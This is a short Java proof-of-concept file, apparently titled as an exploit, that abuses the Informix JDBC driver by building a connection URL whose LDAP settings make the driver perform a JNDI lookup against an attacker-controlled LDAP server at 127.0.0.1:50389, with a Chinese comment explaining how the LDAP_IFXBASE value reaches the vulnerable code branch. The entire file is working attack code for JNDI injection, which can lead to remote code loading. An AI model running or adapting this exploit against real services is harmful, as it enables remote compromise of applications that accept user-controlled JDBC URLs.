package com;

import com.informix.jdbc.IfxDriver;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Exp {
    public static void main(String[] args) throws SQLException, NamingException {
        // LDAP_IFXBASE一定得有斜杠，且斜杠后面要有字符，这样才能进入com.sun.jndi.toolkit.ctx.ComponentContext.p_resolveIntermediate里的else if
        String url = "jdbc:informix-sqli:informixserver=aaaxxx;user=informix;password=in4mix;SQLH_TYPE=LDAP;LDAP_URL=ldap://127.0.0.1:50389/;LDAP_IFXBASE=a84b74/aaa";
        DriverManager.registerDriver(new IfxDriver());
        DriverManager.getConnection(url);
    }

}
